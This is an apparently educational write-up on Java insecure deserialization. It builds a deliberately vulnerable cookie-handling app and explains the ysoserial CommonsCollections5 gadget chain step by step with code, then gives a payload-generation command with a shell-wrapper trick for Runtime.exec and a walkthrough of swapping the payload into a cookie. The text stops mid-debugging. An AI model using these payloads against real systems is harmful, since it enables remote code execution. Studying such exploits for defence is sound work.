<div align="center">

# Java Insecure Deserialization Report

</div>

# **1. Introduction**

In Java, `serialization` is the process of converting an object into a byte stream for storage or transmission, while `deserialization` is the process of reconstructing an object from that byte stream. This mechanism efficiently supports data exchange between systems or object state preservation. However, when not implemented securely, it can lead to an `insecure deserialization` vulnerability, creating opportunities for attackers to exploit the system.

This report will describe in detail:

- The causes of `insecure deserialization`.

- Building a Java application containing a deserialization vulnerability.

- Presenting the exploitation process using `ysoserial` and analyzing the `gadget-chain` leading to RCE.

- Detailed debugging steps of the execution flow in the `gadget-chain`.

- Proposed preventive measures to protect systems against `deserialization` attacks.

---

# **2. What is Deserialization Vulnerability in Java?**

`Insecure deserialization` occurs when a Java application deserializes untrusted input data (typically user-provided) without proper validation or control mechanisms. This allows attackers to manipulate serialized objects, inject malicious data into the application code, or even replace the original object with an object of a completely different class. Notably, during deserialization, any class available in the application's classpath can be decoded and instantiated, regardless of whether that class is expected or not. Therefore, this vulnerability is sometimes called `object injection`.

## **2.1 Impact of Deserialization Vulnerability**

The `insecure deserialization` vulnerability can have serious consequences by expanding the application's attack surface. It allows attackers to exploit existing code in dangerous ways, leading to various types of vulnerabilities, most commonly remote code execution (RCE).

Even when RCE is not feasible, this vulnerability can still be exploited to perform privilege escalation, unauthorized file access, or denial of service (DoS) attacks.

## **2.2 Examples of Deserialization Errors in Java**

A typical example is the use of unsafe objects like **`ObjectInputStream.readObject()`** without checking the type of object being sent. When an unvalidated object is deserialized, an attacker can change the object's class type and inject executable code.

```java
ObjectInputStream ois = new ObjectInputStream(inputStream);
MyObject obj = (MyObject) ois.readObject();  // This is where the error occurs if input data isn't validated.
```

# **3. Building the Vulnerable Application**

## **3.1. General Information About the Application**

- **Application Name:** Java Insecure Deserialization
- **Purpose:**  
  The application is built to understand and analyze the _insecure deserialization_ vulnerability in Java, as well as analyze the gadget-chain created by the _ysoserial_ tool.

- **Environment & Technologies Used:**
  - **Language:** Java (version 8)
  - **Project management:** Apache Maven
  - **Framework:** Spring Boot 2.7.18
  - **Server:** Embedded Tomcat (integrated in Spring Boot)
  - **Related technology:** Servlet (used to interact with cookies)
  - **Environment:** Local

---

## **3.2. Details About the Affected Endpoint and Operational Flow**

The application is built as a simple registration and login website, with 4 main endpoints as follows:

1. **/register:**

   - **Function:** Allows users to register an account.
   - **Processing:** Registration data is stored in a _HashMap_ (not using a database, just temporary).

2. **/login:**

   - **Function:** Allows users to log in.
   - **Processing:**
     - After successful login, the website creates a cookie named **user_session**.
     - The cookie value is the username that is _serialized_ and then _base64_ encoded.

3. **/home:**

   - **Function:** Home page displays the content "Hello [username]".
   - **Processing:**
     - Checks for the existence of the _user_session_ cookie.
     - If there's no cookie, returns Forbidden.
     - If present, the cookie is base64 decoded, then deserialized to extract the username. If the cookie deserializes to a valid value, it displays "Hello [username]", otherwise it displays "Invalid Cookie".

4. **/logout:**
   - **Function:** Deletes the cookie and redirects the user to the login page.

---

## **3.3. Code Causing the Vulnerability**

The application uses `Apache Commons Collections 3.1`, an old library containing known vulnerabilities, with gadget-chains that have been researched and exploited. Using the **ysoserial** tool with options _CommonsCollections5_, _CommonsCollections6_ or _CommonsCollections7_ will help create payloads to exploit this vulnerability. **In this report, we will analyze the gadget-chain of _CommonsCollections5_**.

At the `/login` and `/home` endpoints, the cookie processing is affected by deserialization without adequate security checks. The cookie processing code is shown below:

![serial_deserial.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fserial_deserial.png?alt=media&token=e950f5ce-10b0-4bd1-88ae-0ed8bfa5bd4d)

<div align="center">

_Serialize and Deserialize methods with base64 encoding_

</div>
<br><br>

![login_home.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Flogin_home.png?alt=media&token=0a179a7c-923d-4dd0-a873-85370c0ea360)

<div align="center">

_/login and /home endpoints_

</div>

Upon successful login, a cookie named _user_session_ is created with the value being the _username_ processed through the _serializeToBase64_ method. The /home endpoint then processes this cookie value; if present, it goes through the _deserialFromBase64_ method without validation or blacklisting of valid classes when performing _readObject()_, allowing hackers to inject payloads through the cookie value.

## **3.4. Supporting Information**

#### Using ysoserial

- Use the **ysoserial** tool with **CommonsCollection5 (6, 7)** option to create malicious payloads. Note that JDK8 is required to create the payload.
- The created payload is then _base64_ encoded and used to replace the **user_session** cookie value after successful login.

#### Exploit

- Even though the interface displays an _"invalid cookie"_ message, the backend still proceeds with **deserializing** the cookie and successfully executes the gadget-chain.
- The debugging process (setting breakpoints in the IDE) helps observe the execution flow:
  1. **Deserialize value from cookie**
  2. **Load and execute the gadget chain** (calling `Runtime.getRuntime().exec()`)

---

# **4. Analysis of CommonsCollections5 Gadget-chain**

## **4.1. What is a Gadget-chain?**

In the context of **Insecure Deserialization**, a **gadget-chain** is a sequence of objects linked together in a specific way. Each object in this chain contains a "gadget," which is a small piece of code capable of performing a specific action. An attacker creates a chain of serialized gadgets, and when the application deserializes this chain, the gadgets are executed in a specific order, leading to the execution of a dangerous action, such as RCE.

## **4.2. Detailed Analysis**

![gadget_chain.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fgadget_chain.png?alt=media&token=5a4bb86d-c5bd-4c8d-85cb-9ee765505b0d)

<div align="center">

_CommonsCollections5 Gadget-Chain_

</div>
<br></br>

![code_gen_payload.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fcode_gen_payload.png?alt=media&token=03050e62-4bca-4198-8632-4876182e8e44)

<div align="center">

_Code that generates the payload_

</div>

---

### #1 Command Input

![command.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fcommand.png?alt=media&token=76f7c2dd-a43a-477a-b23b-298684979ed8)

The `execArgs` object is created with the String type with the value being the `command` provided by the user, depending on the command the payload creator wants to execute.

![debug command](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug_command.png?alt=media&token=687f16e2-148c-4d6b-96c7-6d2b6afc0f65)

---

### #2 Initializing the Transformer

![fake_transform.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Ffake_transform.png?alt=media&token=6b6180a3-fbbd-44f6-a14e-96e96b85fb87)
`Transformer` is an interface with the method `transform(Object input)`, which takes an input value and returns a different value. Here the `transformerChain` object is initialized as a `ChainedTransformer` which is a subclass of Transformer, containing a `ConstantTransformer(1)`. `ChainedTransformer` is a special Transformer that takes a list of `Transformer[]` and calls each Transformer sequentially.

Initially, we only initialize `ConstantTransformer(1)` because it only returns 1, making it harmless and avoiding premature payload execution. We'll replace it with the actual payload later.

![debug_fake_chain.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug_fake_chain.png?alt=media&token=b853b029-bd4c-4048-9f9b-3fc3ec943948)

---

### #3 The Real Transformer Chain

![real_transformer.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Freal_transformer.png?alt=media&token=6faeff8e-b591-46c9-8bbb-3fb661491519)
The `transformers` object is initialized as an array of Transformer[] with 5 component Transformers, in sequence:

```java
new ConstantTransformer(Runtime.class)
```

`ConstantTransformer` is a Transformer that returns a specific value, in this case it returns `Runtime.class`

![debug_runtimeclass.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug_runtimeclass.png?alt=media&token=8e132dd5-7c1f-4d12-87bd-53afc68a87fb)

<div style="width: 350px; height: 0.5px; background-color: black; margin: 15px auto;"></div>

```java
new InvokerTransformer("getMethod", new Class[] {
            String.class, Class[].class },
            new Object[] {
                "getRuntime", new Class[0] })
```

Next, `InvokerTransformer` will get the `getRuntime()` method of the `Runtime` class. The structure of `InvokerTransformer` is:

```java
new InvokerTransformer(methodName, paramTypes, args)
```

`methodName`: The name of the method to call.

`paramTypes`: List of parameter data types.

`args`: List of argument values.

- **`methodName`**:

In the payload creation code, `methodName` is `"getMethod"`, which is a method of the `Class` class used to call a method on an object.

<br>

- **`paramTypes`**:

This is the list of data types of parameters that the `"getMethod"` method requires. The `getMethod()` method is defined in Java as:

```java
Method getMethod(String name, Class<?>... parameterTypes)
```

`String name`: The name of the method to find ("getRuntime").

`Class<?>... parameterTypes`: List of parameter data types of the method to find.

In the code, `paramTypes` is:

```java
new Class[] { String.class, Class[].class }
```

`String.class`: Data type of the first parameter ("getRuntime" - method name).

`Class[].class`: Data type of the second parameter (new Class[0] - list of parameters of that method).

<br>

- **`args`**:

```java
new Object[] { "getRuntime", new Class[0] }
```

`"getRuntime"`: String name of the method to find in `Runtime.class`.

`new Class[0]`: List of parameters of the `getRuntime()` method, which has no parameters, so an empty array (`new Class[0]`) is passed.

After running through this `InvokerTransformer`, it returns `Runtime.getRuntime()` to prepare to call the `exec` method.

![debug_getruntime.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug_getruntime.png?alt=media&token=06d10570-df9d-45e4-b8fa-5a26e9f01ece)

<div style="width: 350px; height: 0.5px; background-color: black; margin: 15px auto;"></div>

```java
new InvokerTransformer("invoke", new Class[] {
            Object.class, Object[].class },
            new Object[] {
                null, new Object[0] })
```

The function and structure are still the same as the `InvokerTransformer` above. This time, it has the task of executing `Runtime.getRuntime()` to get the `Runtime` object.

![debug_invoke.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug_invoke.png?alt=media&token=e3dfd5d5-ac35-47d7-b822-97e7e9065f65)

<div style="width: 350px; height: 0.5px; background-color: black; margin: 15px auto;"></div>

```java
new InvokerTransformer("exec", new Class[] { String.class }, execArgs)
```

With the final `InvokerTransformer`, it calls the `exec()` method of the `Runtime` object (`Runtime().getRuntime().exec(command)` or `Runtime().exec(command)`) to execute the provided command.

![debug_exec.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug_exec.png?alt=media&token=0058f66a-b1c5-4e76-8826-f0912b7afc90)

<div style="width: 350px; height: 0.5px; background-color: black; margin: 15px auto;"></div>

```java
new ConstantTransformer(1)
```

The final _ConstantTransformer_ returns **1** to finish and avoid errors.

![debug_endconst.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug_endconst.png?alt=media&token=88172388-17dc-4c11-ba45-8436bf677131)

---

### #4. Creating LazyMap and TiedMapEntry

![lazymap_tiedmap.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Flazymap_tiedmap.png?alt=media&token=2f6b4245-1417-4c5d-8ee9-05a00344ce36)

```java
final Map innerMap = new HashMap();
final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
```

In the _Apache Commons Collections_ library, `LazyMap` is a class that acts like a regular `Map` but can automatically generate values when a key doesn't exist. When accessing a key that doesn't exist in `LazyMap`, it will call the `Transformer` to create a new value.

The `innerMap` object is a regular `HashMap`, initially empty and without any special mechanisms. The `LazyMap.decorate(innerMap, transformerChain)` method wraps `innerMap` into a `LazyMap`. The resulting `lazyMap` object is a LazyMap where:

- The actual data is still stored in `innerMap`.
- `transformerChain` acts as a factory: When a key doesn't exist in innerMap, instead of returning null, LazyMap will call `transformerChain.transform(key)` to create the corresponding value. Initially, `transformerChain` is just a fake chain, returning only `1`, but it will be replaced with the real chain later.

![debug_lazymap.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug_lazymap.png?alt=media&token=92e3f132-ae2e-4266-b343-e1fb4205bb18)

<div style="width: 350px; height: 0.5px; background-color: black; margin: 15px auto;"></div>

```java
TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
```

`TiedMapEntry` is also a class in `Apache Commons Collections`, designed to link a Map with a specific key. The `entry` object created is a `TiedMapEntry` that connects `lazyMap` with the key `"foo"`. When `entry.toString()` is called, it will call `lazyMap.get()` because the key "foo" doesn't exist yet, and `transformerChain.transform()` will be called, triggering the gadget-chain.

![debug_tiedmap.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug_tiedmap.png?alt=media&token=63df2812-0977-4592-9c74-acae377ceb96)

---

### #5. Assigning to `BadAttributeValueExpException` for Automatic Triggering

![BadAttribute.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2FBadAttribute.png?alt=media&token=9b536a10-c22e-477e-abf2-e270acf6589e)

```java
BadAttributeValueExpException val = new BadAttributeValueExpException(null);
```

`BadAttributeValueExpException` is a class in Java, used when there's an error in the value of an attribute. `val` is an object of this class. Here, when initializing the `val` object, we pass `null` because this value will be changed later to override the `toString()` method, causing the `toString()` of `TiedMapEntry` to be triggered.

![debug_val.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug_val.png?alt=media&token=2924d3cc-3579-4c63-91c3-ea245dda84c8)

<div style="width: 350px; height: 0.5px; background-color: black; margin: 15px auto;"></div>

```java
Field valfield = val.getClass().getDeclaredField("val");
```

The `valfield` object belongs to the `Field` class. The `getClass()` method returns a Class object representing the class of `val` (BadAttributeValueExpException). The `getDeclaredField(String fieldName)` method is a method of the `Class` class, helping to get information about a specific field in the class. It returns a Field object containing information about the "val" field, whether it's private, protected, or public.

![debug_valfield.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug_valfield.png?alt=media&token=2954f9ce-6f7d-4a20-b1cc-21582658a0a3)

<div style="width: 350px; height: 0.5px; background-color: black; margin: 15px auto;"></div>

```java
Reflections.setAccessible(valfield);
```

The `setAccessible()` method in `Reflections.java` (from ysoserial) has the task of bypassing Java's access restrictions, helping us to modify the value of a private field. The source code of the `setAccessible` method in `Reflections.java`:

```java
public static void setAccessible(AccessibleObject member) {
        String versionStr = System.getProperty("java.version");
        int javaVersion = Integer.parseInt(versionStr.split("\\.")[0]);
        if (javaVersion < 12) {
            Permit.setAccessible(member);
        } else {
            member.setAccessible(true);
        }
    }
```

The `setAccessible()` method is a wrapper that calls `setAccessible(true)` from native Java (`AccessibleObject.java`). This wrapper simplifies bypassing access restrictions across different Java versions. Meanwhile, the original `setAccessible(true)` incorporates security checks to prevent unauthorized access.

- For Java versions < 12, `setAccessible(member)` calls `Permit.setAccessible(member)` to bypass access restrictions without causing runtime warnings.
- From Java 12 onwards, `member.setAccessible(true)` is called directly. However, due to the enhanced security of the module system (JPMS), `Permit` becomes unnecessary and less effective. At this point, `setAccessible(true)` only works when not blocked by the `SecurityManager` or JPMS restrictions (such as an unopened module).

The `setAccessible()` called here helps to change the value of the private field `val`.

![debug_setAccess.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug_setAccess.png?alt=media&token=95777be7-eebf-45c3-9d28-b4d9d010933d)

<div style="width: 350px; height: 0.5px; background-color: black; margin: 15px auto;"></div>

```java
valfield.set(val, entry);
```

The `set(Object obj, Object value)` method of the `Field` class sets the value of the `val` field in the `val` object to `entry`. `entry` was previously assigned as a `TiedMapEntry`.

![debug_setField.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug_setField.png?alt=media&token=185879c7-82d2-4033-b766-4783cfc6131e)

<div style="width: 350px; height: 0.5px; background-color: black; margin: 15px auto;"></div>

```java
Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
```

The source code of the `setFieldValue()` method in `Reflections.java`:

```java
public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
```

`setFieldValue(obj, fieldName, value)` has the main function of finding and changing the value of a private or protected field - fields that normally cannot be accessed from outside the class - in an object. In this case, it sets the value of `iTransformers` in `transformerChain` (fake chain) to `transformers` (real chain).

![debug_replace.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug_replace.png?alt=media&token=67a72784-11b5-48b3-967c-64f4971546df)

### #6. Conclusion

When the payload is passed to `readObject()`, the sequence will be:

1. `val.toString()` is called

2. `entry.toString()` is called

3. `lazyMap.get("foo")` is called

4. `transformers.transform("foo")` is called

5. `ChainedTransformer` executes each step:

   - Runtime.class

   - .getMethod("getRuntime")

   - .invoke(null) â†’ Runtime.getRuntime()

   - .exec(command) â†’ Execute the command.

---

# **5. Creating Payloads with ysoserial**

`ysoserial` is an open-source tool that helps create payloads to exploit insecure deserialization vulnerabilities in Java applications. This tool contains many gadget-chains based on popular libraries, allowing attackers to achieve RCE if the target application doesn't have secure deserialization control mechanisms.

## **5.1. Identifying the Appropriate Gadget-chain**

Before creating a payload, it's necessary to identify the libraries present in the target application by checking the classpath, WEB-INF/lib directory, or the pom.xml file. For example, if the application uses Commons Collections 3.1, we can use gadgets like CommonsCollections5, 6, or 7.

## **5.2. Creating the Payload**

Command structure:

```sh
java -jar ysoserial-[version]-all.jar [payload] '[command]'
```

- java: JDK 8 should be used to ensure compatibility.

- payload: The type of gadget-chain suitable for the target application.

- command: The system command that will be executed when the payload is deserialized.

Using `CommonsCollections5` as an example, which was analyzed in this report, in a web application using `Apache Commons Collection 3.1` so it's valid, we would have the command:

```sh
java8 -jar ysoserial-all.jar CommonsCollections5 'sh -c $@|sh . echo open -a Calculator'
```

![payload.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fpayload.png?alt=media&token=e3d27387-73d3-4373-bed4-2599095e76fd)

In the web application demonstrating the deserialization vulnerability, user data is serialized then base64 encoded before being stored in a cookie, so when creating the payload, it also needs to be base64 encoded to be inserted into the cookie, as the payload will be base64 decoded then deserialized.

## **5.3. Notes on Runtime.exec()**

In the process of creating and exploiting payloads, the `Runtime.getRuntime().exec(command)` command is used to execute system commands. But if you just pass a command as you would on a normal shell to create the payload, it won't work as expected when deserialized.

In the article "sh â€“ Or: Getting a shell environment from Runtime.exec", author Markus Wulftange discusses using the Runtime.exec method in Java on Unix systems. He points out that when using Runtime.exec, commands are not executed in an actual shell, leading to features like pipes, redirections, quoting, or expansions not working as expected.

To overcome this, the author suggests using the command `sh -c $@|sh . echo [command]` to create a full shell environment, allowing the execution of complex commands with all shell features. This method takes advantage of sh's ability to pass commands through standard input, helping to overcome the limitations of Runtime.exec.

However, when using this method, it's important to note that important spaces in the command must be properly encoded, as Java's StringTokenizer will separate the command string at any whitespace character.

Article link: https://codewhitesec.blogspot.com/2015/03/sh-or-getting-shell-environment-from.html

Tool to help create runtime.exec payloads faster: https://ares-x.com/tools/runtime-exec/

![tool_runtime.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Ftool_runtime.png?alt=media&token=c3e4bb98-c050-492d-94db-b9c69b7637c6)

---

# **6. Debugging a Website with Insecure Deserialization Leading to RCE**

In the process of debugging the demo website, we use IntelliJ IDEA to leverage convenient debugging features.

## **6.1. Determining Breakpoints**

To debug effectively, breakpoints are set at key points in the application and the `CommonsCollections5` gadget-chain to monitor the execution flow from cookie deserialization to RCE.

- **/login Endpoint**: Set a breakpoint to see the username value during login, observe it being serialized and added to the `user_session` cookie.
  ![endpoint_login.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fendpoint_login.png?alt=media&token=4332f695-ef7f-4fa2-893f-1ea2c4dcbb57)

- **/home Endpoint**: Breakpoint at the cookie processing step before deserialization, confirming the input data.
  ![endpoint_home.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fendpoint_home.png?alt=media&token=d5ac123d-90db-45a3-8d1d-6a35e675d69d)

- **Deserialize cookie**: Breakpoint at the step of deserializing the user_session cookie to see the payload being passed in.
  ![deserialize.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdeserialize.png?alt=media&token=b23cf505-5393-4158-a961-feb8e57f266d)

- `CommonsCollections5` Gadget-chain: Breakpoints in the main classes:

  - `BadAttributeValueExpException.readObject()`:
    ![badattribute2.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fbadattribute2.png?alt=media&token=22158980-b87f-4aa6-8023-208a35b86845)

  - `TiedMapEntry.toString()`,`TiedMapEntry.getKey()` and `TiedMapEntry.getValue()`: Monitor LazyMap activation.
    ![TiedMapEntry_toString.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2FTiedMapEntry_toString.png?alt=media&token=fabc1857-06b3-4d72-916c-a11348ef13e8)
    ![TiedMapEntry_getValue.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2FTiedMapEntry_getValue.png?alt=media&token=ac500d97-c029-4268-ab8a-c6ea840273a8)

  - `LazyMap.get()`: Preparing to activate ChainedTransformer
    ![lazymap_get.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Flazymap_get.png?alt=media&token=e0a09032-ea6b-4286-88fc-d9792ccc3cac)
  - `ChainedTransformer.transform()`: Analyze each transformer step.
    ![ChainedTransformer.tranform()](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fchainedtransformer_transform.png?alt=media&token=743d75b1-c506-4db9-8aa0-c3363c895a22)
  - `ConstantTransformer.transform()`:
    ![constanttransformer.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fconstanttransformer.png?alt=media&token=0783e3c0-be67-4c4d-aed5-63dd13f5d887)
  - `InvokerTransformer.transform()`: View the system command being executed.
    ![invokertransformer.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Finvokertransformer.png?alt=media&token=8d8b5f44-a7b2-4606-9e6c-8d2efe155e9f)

## **6.2. Detailed Debugging of the Execution Flow**

When accessing the website, the login page appears first:
![login_page.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Flogin_page.png?alt=media&token=7e407dd6-2ba8-41d2-ada0-04dcbd7be123)
We'll register before logging in, registration page:
![register_page.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fregister_page.png?alt=media&token=7aada999-7f45-4268-80a8-5b63f926035e)
When sign up is successful, the website reports "Registration Successfully":
![register_success.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fregister_success.png?alt=media&token=e52be3a3-003e-4c9c-ab66-d2547ac0ebaf)
After successful login, we'll be redirected to the Home Page:
![home_page.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fhome_page.png?alt=media&token=cc0c595e-1613-437a-bdb5-5256ce96cf0e)
On the Home Page, we see a line saying "Hello test!" with `test` being the username we just registered and used to log in. In `AuthController`, the `username` when logging in will be serialized then base64 encoded and stored in a cookie named `user_session`:
![debug2_cookie.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_cookie.png?alt=media&token=f723765b-bedb-4168-9dcc-e5345cb778c1)

After the `username` is successfully serialized, base64 encoded and added to the cookie, the `/auth/home` endpoint will be called and the process of deserializing the cookie will take place to read the username that was previously serialized and base64 encoded, then display "Hello [username]":
![debug2_deserialize_cookie.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_deserialize_cookie.png?alt=media&token=6215d9c8-f1c6-4d93-8353-c0b6cd54f7e0)

![debug2_deserialize_cookie2.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_deserialize_cookie2.png?alt=media&token=d100c8bc-a0fd-4edf-8a97-5e80cca7ecc6)

We can also check the cookie in the browser:
![cookie_browser.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fcookie_browser.png?alt=media&token=2d0df3fe-db90-4679-94e0-ef1d1708d299)
Now we can change the cookie value with the payload created in [section 5](#5-creating-payloads-with-ysoserial):
![cookie_payload.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fcookie_payload.png?alt=media&token=da4915b5-ae78-4384-affb-9fea8633bd5f)
When reloading, the `/home` endpoint is called again, the cookie containing the payload will go into the `deserializeFromBase64` method to decode base64 and deserialize:
![debug2_payloadintodeserialize.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_payloadintodeserialize.png?alt=media&token=6e5169bc-d047-4022-b6d5-9f687a5136a9)
![debug2_payloadintodeserializefunc.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_payloadintodeserializefunc.png?alt=media&token=643c249e-56c5-4e11-921f-5cbd7f0f5e00)

When the payload goes into `.readObject()` in the `deserializeFromBase64` method, it is the object that was pre-created to execute the gadget-chain, which will override the `readObject()` method in the `BadAttributeValueExpException` class:
![debug2_readobject_badattr.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_readobject_badattr.png?alt=media&token=e97b18c1-8695-4073-a0f1-48b2faece071)

The `valObj` object, taken from `gf.get("val", null)` in `readObject` of `BadAttributeValueExpException`, is the value of the `val` field from the deserialized data. With the payload from ysoserial, `valObj` is a `TiedMapEntry`, it activates `toString()` in the final branch:
![debug2_valObj_toString.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_valObj_toString.png?alt=media&token=c3e645c2-9133-4d29-be1b-94dfe818ce25)

And `valObj` is a `TiedMapEntry`, when `toString()` is called on `valObj`, the `toString()` method of `TiedMapEntry` will be activated:
![debug2_tiedmapentry_tostring.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_tiedmapentry_tostring.png?alt=media&token=8e466e65-8454-4b31-9ba6-46971127964a)

The `TiedMapEntry.toString()` method successively calls `getKey()` (returns "foo") and `getValue()`, `getValue()` returns `map.get(key)`, which is `map.get("foo")`:
